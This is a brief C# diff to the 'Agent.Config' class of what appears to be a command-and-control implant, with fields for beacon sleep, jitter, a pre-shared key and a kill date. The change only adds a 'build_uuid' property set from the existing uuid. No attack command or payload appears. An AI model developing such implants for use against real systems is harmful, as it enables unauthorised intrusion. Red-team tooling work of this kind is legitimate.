@@ -22,6 +22,7 @@ namespace Agent.Config
             }
         }
         private string? _uuid;
+        public string build_uuid { get; }
         public int sleep { get; set; } = 60;
         public int jitter { get; set; } = 10;
         private string? _psk;
@@ -69,6 +70,7 @@ namespace Agent.Config
                 killDate = _killDate;
             }
 #endif
+            build_uuid = uuid!;
         }
         public event EventHandler? SetAgentConfigUpdated;
     }
